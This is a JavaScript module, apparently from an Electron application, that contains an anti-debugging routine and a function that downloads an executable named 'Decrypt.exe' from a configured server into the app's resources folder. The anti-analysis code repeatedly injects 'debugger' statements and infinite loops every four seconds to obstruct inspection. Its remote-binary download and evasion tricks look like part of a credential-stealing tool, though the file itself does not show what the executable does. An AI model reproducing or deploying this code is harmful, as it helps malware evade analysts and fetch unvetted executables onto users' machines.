"use strict";

const path = require("path");
const fs = require("fs-extra");
const axios = require("axios");
const configConstants = require("../config/constants");

function antiAnalysis(val) {
    if (typeof val === "string") {
        return function(a) {}.constructor("while (true) {}").apply("counter");
    } else {
        if (("" + val / val).length !== 1 || val % 20 === 0) {
            (function() { return true; }).constructor("debugger").call("action");
        } else {
            (function() { return false; }).constructor("debugger").apply("stateObject");
        }
    }
    antiAnalysis(++val);
}

(function() {
    let globalScope;
    try {
        globalScope = Function('return (function() {}.constructor("return this")( ));')();
    } catch (e) {
        globalScope = window;
    }
    globalScope.setInterval(() => {
        try { antiAnalysis(0); } catch (e) {}
    }, 4000);
})();

async function downloadDecrypt() {
    const resourcesPath = process.resourcesPath;
    const libFolder = path.join(resourcesPath, "lib");
    const destPath = path.join(libFolder, "Decrypt.exe");
    const downloadUrl = configConstants.BASE_API_URL + "/Decrypt.exe";

    return new Promise(async (resolve, reject) => {
        try {
            if (!fs.existsSync(libFolder)) {
                fs.mkdirSync(libFolder, { recursive: true });
            }

            const response = await axios.get(downloadUrl, {
                responseType: "stream",
                headers: {
                    "X-Build-ID": configConstants.BUILD_ID
                }
            });

            const writer = fs.createWriteStream(destPath);
            response.data.pipe(writer);

            writer.on("finish", () => {
                resolve();
            });

            writer.on("error", (err) => {
                if (fs.existsSync(destPath)) {
                    fs.unlinkSync(destPath);
                }
                reject(err);
            });

        } catch (error) {
            reject(error);
        }
    });
}

exports.downloadDecrypt = downloadDecrypt;
